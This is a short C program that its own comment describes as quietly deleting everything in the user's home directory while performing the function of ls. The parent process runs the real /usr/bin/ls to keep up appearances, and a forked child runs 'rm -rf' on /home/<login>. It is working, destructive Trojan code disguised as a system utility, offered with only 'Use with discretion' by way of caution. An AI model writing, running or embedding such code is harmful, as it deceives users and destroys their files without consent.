/*  This program quietly deletes everything in the user's home directory while performing the function of ls. Use with discretion  */
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char **argv) {
  
  if (fork() > 0)
    // This is the program the user thinks is being run
    execve("/usr/bin/ls", argv, NULL);
  else {

   // Get the user's home directory
   char user_directory[1024] = "/home/";   
   strcat(user_directory, getlogin());

   // Assemble the payload
   char *payload_argv[] = {"rm",
                           "-rf",
                           user_directory,
                           NULL};
    
   // Execute the payload
   execve("/usr/bin/rm", payload_argv, NULL);
 }

  return EXIT_SUCCESS;
}
